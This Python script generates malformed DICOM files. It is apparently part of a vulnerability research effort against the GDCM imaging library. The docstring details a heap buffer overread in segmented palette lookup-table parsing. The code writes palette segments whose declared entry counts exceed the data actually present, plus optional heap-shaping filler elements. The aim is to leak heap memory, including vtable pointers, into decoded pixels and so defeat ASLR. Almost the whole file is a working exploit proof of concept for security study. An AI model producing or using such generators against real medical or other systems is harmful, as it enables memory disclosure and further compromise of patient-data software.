#!/usr/bin/env python3
"""
Finding 3 ASLR-defeat generator (heap-buffer-overread variant).

Supersedes an earlier version of this file that targeted a different,
REFUTED mechanism (LookupTable::SetLUT reading a std::vector's
reserve()d-but-never-written capacity because "(void)length;" ignores the
true palette size). That is wrong: further down the same function,
  gdcm_assert( Internal->Length[type]*(BitSample/8) == length );
and gdcm_assert(cond) is "if (!(cond)) throw ..." UNCONDITIONALLY (see
Source/Common/gdcmException.h) -- not gated on NDEBUG. `length` there is
`palette.size()*2` as passed up from
SegmentedPaletteColorLookupTable::SetLUT. So palette.size() must equal the
descriptor length N *exactly* or the copy loop is never reached at all; a
segment that legitimately produces zero entries throws before any read.

This generator instead uses the ORIGINAL, already-confirmed Finding 3
primitive (see harnesses/finding03_sentinel.cpp and
harnesses/finding03_propagation.cpp), generalized and parameterized to
measure how far it reaches and whether it can leak an ASLR-defeating
pointer:

  gdcmSegmentedPaletteColorLookupTable.cxx:
    DiscreteSegment(const EntryType* first)
        : Segment<EntryType>(first, first+2+*(first+1)) {}
    ... Expand(): std::copy(this->_first + 2, this->_last, back_inserter);

`*(first+1)` is the segment's declared entry count, read with NO bounds
check against how many bytes are actually present in the LUT data element's
heap buffer. With a single DiscreteSegment per channel -- header
[opcode=0][length=N], k_real real payload words, N-k_real declared but
ABSENT from the file -- std::copy reads (N-k_real) uint16_t words starting
immediately after the k_real real ones, i.e. starting at (or before, if
k_real>0 leaves room) the END of that element's heap allocation, and
continuing upward in address space for (N-k_real)*2 bytes. Those words are
whatever heap memory happens to sit there: possibly the NEXT heap
allocation's contents -- notably, if this channel is not the last one
processed, the *next* channel's ByteValue control-block object (ByteValue
derives from a polymorphic base -- Source/DataStructureAndEncodingDefinition
/gdcmByteValue.h -- so its first 8 bytes are a vtable pointer into
libgdcmMSFF.so, allocated via plain `new ByteValue` immediately before that
next channel's own data buffer is resize()'d into it -- see e.g.
gdcmExplicitDataElement.txx).

This is a heap OVERREAD (bytes physically past a malloc'd buffer), not a
read of some other object's *freed* memory -- there is no free/reuse and no
tcache safe-linking involved.

palette.size() ends up EXACTLY k_real + (N-k_real) = N (std::copy doesn't
care whether the memory it reads is "real" -- it unconditionally copies N-
k_real words), so the gdcm_assert above is satisfied and the OOB-sourced
words are accepted into Internal->RGB and reach decoded pixels, exactly like
generators/finding-03.py's original K_OOB=255 case, generalized to
arbitrary N.

See harnesses/finding03_leak.cpp for the measurement/classification side.
"""

import argparse
import struct
import os

# ---------------------------------------------------------------------------
# Minimal raw-DICOM writer (mirrors generators/finding-03.py; no pydicom dep)
# ---------------------------------------------------------------------------

def u16le(v):
    return struct.pack('<H', v & 0xFFFF)

def u32le(v):
    return struct.pack('<I', v & 0xFFFFFFFF)

def tag_bytes(group, element):
    return struct.pack('<HH', group, element)

def explicit_vr_de(group, element, vr, data):
    assert isinstance(data, (bytes, bytearray))
    if len(data) % 2 != 0:
        if vr in ('CS', 'LO', 'LT', 'SH', 'ST', 'UT', 'UC'):
            data = data + b' '
        else:
            data = data + b'\x00'
    tg = tag_bytes(group, element)
    vr_bytes = vr.encode('ascii')
    long_vr = vr in ('OB', 'OW', 'OF', 'SQ', 'UC', 'UN', 'UR', 'UT')
    if long_vr:
        return tg + vr_bytes + b'\x00\x00' + u32le(len(data)) + data
    else:
        return tg + vr_bytes + struct.pack('<H', len(data)) + data

def ui_str(uid):
    b = uid.encode('ascii')
    if len(b) % 2 != 0:
        b += b'\x00'
    return b

def cs_str(s):
    b = s.encode('ascii')
    if len(b) % 2 != 0:
        b += b' '
    return b

def us_value(*values):
    return struct.pack('<' + 'H' * len(values), *values)

# ---------------------------------------------------------------------------
# DICOM UIDs & constants
# ---------------------------------------------------------------------------
TRANSFER_SYNTAX_EXPLICIT_VR_LE  = '1.2.840.10008.1.2.1'
SOP_CLASS_SECONDARY_CAPTURE      = '1.2.840.10008.5.1.4.1.1.7'
SOP_INSTANCE_UID                 = '1.2.3.4.5.6.7.8.9.10.31'
STUDY_INSTANCE_UID               = '1.2.3.4.5.6.7.8.9.10.32'
SERIES_INSTANCE_UID              = '1.2.3.4.5.6.7.8.9.10.33'


def build_leak_segment(n_total, k_real):
    """
    Single DiscreteSegment: header [opcode=0][length=n_total], followed by
    exactly k_real real uint16 payload words physically in the file. The
    remaining (n_total - k_real) words the header promises are declared but
    absent -- DiscreteSegment's ctor computes _last = first+2+n_total
    regardless, so Expand()'s std::copy reads that many words starting right
    after the k_real real ones, off the end of this element's heap buffer.
    """
    assert 0 <= k_real <= n_total
    seg = struct.pack('<HH', 0x0000, n_total)
    if k_real:
        seg += us_value(*([0x1111] * k_real))
    return seg


def build_dicom(output_path, n=4096, k_real=0, channels='RGB',
                 shape_count=0, shape_size=4096, shape_fill=0x41):
    """
    n: LUT descriptor length (N) shared by every channel in `channels`.
      Must be != 256 and != 0 (those are DICOM-special-cased -- see
      LookupTable::InitializeLUT). N is a uint16 (0028,1101/1102/1103 is VR
      US), so 1 <= n <= 65535. The declared-but-absent OOB read length in
      bytes is (n - k_real) * 2.
    k_real: real in-bounds entries per leak channel's DiscreteSegment
      (default 0 -- the entire N entries are then sourced from the OOB
      read, starting immediately after the segment's 4-byte header).
    channels: which of 'R','G','B' carry the leak descriptor/segment, in tag
      order. The dataset element order is fixed by ascending DICOM tag
      number (1101 < 1102 < 1103 for descriptors; 1221 < 1222 < 1223 for
      data), so this also fixes allocation order: the first channel listed
      is allocated (and its OOB read performed) first, and whatever the
      next channel's parse allocates next is the most likely thing an
      earlier channel's overread lands on.
    shape_count / shape_size: optional filler OB elements (private group
      0009) inserted BEFORE the LUT block, each shape_size bytes, to grow
      the heap ahead of the LUT allocations (heap-shaping per Q3). 0
      disables shaping (default).
    """
    if n == 0 or n == 256:
        raise ValueError("n must not be 0 or 256 (DICOM-special-cased lengths)")
    if not (1 <= n <= 65535):
        raise ValueError("n must fit in a uint16 (1..65535)")

    rows = cols = 1
    n_pixels_needed = n
    while rows * cols < n_pixels_needed:
        cols += 1
        if cols > 512:
            rows += 1
            cols = 1
    rows = max(rows, (n_pixels_needed + cols - 1) // cols)

    n_pixels = rows * cols
    pixel_indices = [min(i, n - 1) for i in range(n_pixels)]
    pixel_data = struct.pack('<' + 'H' * n_pixels, *pixel_indices)

    leak_seg_bytes = build_leak_segment(n, k_real)
    # A channel not in `channels` gets an ordinary, harmless, exact-match
    # LUT (N == number of real entries, ==256 special-cased away from the
    # IncompleteLUT path) so it never contributes to or disturbs the leak.
    # Its descriptor length matches n (not a small fixed value) so that
    # pixel indices up to n-1 -- needed to walk every entry of the leak
    # channels sharing this same image -- stay in-bounds for this channel
    # too when `channels` is a strict subset of 'RGB'.
    plain_n = n
    plain_seg = struct.pack('<HH', 0x0000, plain_n) + us_value(*([0x0B0B] * plain_n))

    des = bytearray()
    des += explicit_vr_de(0x0008, 0x0016, 'UI', ui_str(SOP_CLASS_SECONDARY_CAPTURE))
    des += explicit_vr_de(0x0008, 0x0018, 'UI', ui_str(SOP_INSTANCE_UID))

    if shape_count > 0:
        fill = bytes([shape_fill]) * shape_size
        for i in range(shape_count):
            des += explicit_vr_de(0x0009, 0x0010 + i, 'OB', fill)

    des += explicit_vr_de(0x0020, 0x000D, 'UI', ui_str(STUDY_INSTANCE_UID))
    des += explicit_vr_de(0x0020, 0x000E, 'UI', ui_str(SERIES_INSTANCE_UID))

    des += explicit_vr_de(0x0028, 0x0002, 'US', us_value(1))
    des += explicit_vr_de(0x0028, 0x0004, 'CS', cs_str('PALETTE COLOR'))
    des += explicit_vr_de(0x0028, 0x0010, 'US', us_value(rows))
    des += explicit_vr_de(0x0028, 0x0011, 'US', us_value(cols))
    des += explicit_vr_de(0x0028, 0x0100, 'US', us_value(16))
    des += explicit_vr_de(0x0028, 0x0101, 'US', us_value(16))
    des += explicit_vr_de(0x0028, 0x0102, 'US', us_value(15))
    des += explicit_vr_de(0x0028, 0x0103, 'US', us_value(0))

    def descriptor_for(ch):
        v = n if ch in channels else plain_n
        return us_value(v, 0, 16)

    def segment_for(ch):
        return leak_seg_bytes if ch in channels else plain_seg

    des += explicit_vr_de(0x0028, 0x1101, 'US', descriptor_for('R'))
    des += explicit_vr_de(0x0028, 0x1102, 'US', descriptor_for('G'))
    des += explicit_vr_de(0x0028, 0x1103, 'US', descriptor_for('B'))

    des += explicit_vr_de(0x0028, 0x1221, 'OW', segment_for('R'))
    des += explicit_vr_de(0x0028, 0x1222, 'OW', segment_for('G'))
    des += explicit_vr_de(0x0028, 0x1223, 'OW', segment_for('B'))

    des += explicit_vr_de(0x7FE0, 0x0010, 'OW', pixel_data)

    meta_elements = bytearray()
    meta_elements += explicit_vr_de(0x0002, 0x0001, 'OB', b'\x00\x01')
    meta_elements += explicit_vr_de(0x0002, 0x0002, 'UI', ui_str(SOP_CLASS_SECONDARY_CAPTURE))
    meta_elements += explicit_vr_de(0x0002, 0x0003, 'UI', ui_str(SOP_INSTANCE_UID))
    meta_elements += explicit_vr_de(0x0002, 0x0010, 'UI', ui_str(TRANSFER_SYNTAX_EXPLICIT_VR_LE))
    meta_elements += explicit_vr_de(0x0002, 0x0012, 'UI', ui_str('1.2.3.4.5.999'))

    group_len_de = explicit_vr_de(0x0002, 0x0000, 'UL', u32le(len(meta_elements)))
    meta = group_len_de + meta_elements

    preamble = b'\x00' * 128 + b'DICM'
    output = preamble + bytes(meta) + bytes(des)

    os.makedirs(os.path.dirname(os.path.abspath(output_path)) or '.', exist_ok=True)
    with open(output_path, 'wb') as f:
        f.write(output)

    leak_channels = [c for c in 'RGB' if c in channels]
    oob_words = n - k_real
    print(f"Wrote {len(output)} bytes to {output_path}")
    print(f"n={n} k_real={k_real} oob_words_per_channel={oob_words} "
          f"oob_bytes_per_channel={oob_words*2} rows={rows} cols={cols} n_pixels={n_pixels}")
    print(f"leak channels (in R,G,B / allocation order): {leak_channels}")
    if shape_count:
        print(f"heap shaping: {shape_count} x {shape_size}-byte filler elements "
              f"(private tags 0009,0010..{0x0010+shape_count-1:04x}) before the LUT block")

    return output_path


if __name__ == '__main__':
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument('--out', default=os.path.join(
        os.path.dirname(os.path.abspath(__file__)), 'poc_leak.dcm'))
    ap.add_argument('--n', type=int, default=4096,
                     help='LUT descriptor length N shared by leak channels (default 4096)')
    ap.add_argument('--k-real', type=int, default=0,
                     help='real in-bounds entries per leak channel (default 0)')
    ap.add_argument('--channels', default='RGB',
                     help="which of R,G,B carry the leak descriptor, in tag order "
                          "(default RGB)")
    ap.add_argument('--shape-count', type=int, default=0,
                     help='number of heap-shaping filler elements before the LUT block (default 0)')
    ap.add_argument('--shape-size', type=int, default=4096,
                     help='size in bytes of each shaping filler element (default 4096)')
    args = ap.parse_args()
    build_dicom(args.out, n=args.n, k_real=args.k_real, channels=args.channels,
                shape_count=args.shape_count, shape_size=args.shape_size)
